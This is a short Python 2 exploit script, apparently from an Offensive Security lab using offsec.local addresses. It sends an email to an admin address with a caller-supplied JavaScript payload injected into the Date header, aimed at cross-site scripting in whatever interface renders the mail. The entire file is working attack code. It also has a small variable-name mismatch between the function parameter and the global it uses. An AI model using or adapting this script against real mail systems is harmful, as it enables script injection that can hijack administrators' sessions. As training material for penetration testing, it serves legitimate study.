#!/usr/bin/python

import smtplib, urllib2, sys

def sendMail(dstmail, frmemail, smtpsrv, payload):
	msg = "From: attacker@offsec.local\n"
	msg += "To: admin@offsec.local\n"
	msg += "Date: %s \n" % payload
	msg += "Subject: You Haz been pwnd\n"
	msg += "Content-type: text/html\n\n"
	msg += "Oh noez, you been had!"
	msg += "\r\n\r\n"

	server = smtplib.SMTP(smtpsrv)

	try:
		server.sendmail(frmemail, dstemail, msg)
		print "[+] Email sent!"
	except Exception, e:
		print "[-] Failed to send email:"
		print "[*] " + str(e)

	server.quit()

dstemail = "admin@offsec.local"
frmemail = "attacker@offsec.local"

if not (dstemail and frmemail):
	sys.exit()

if __name__=="__main__":
	if len(sys.argv) != 3:
		print "[+] Usage: %s <server> <js payload>" % sys.argv[0]
		sys.exit(-1)

	smtpsrv = sys.argv[1]
	payload = sys.argv[2]

	sendMail(dstemail, frmemail, smtpsrv, payload)
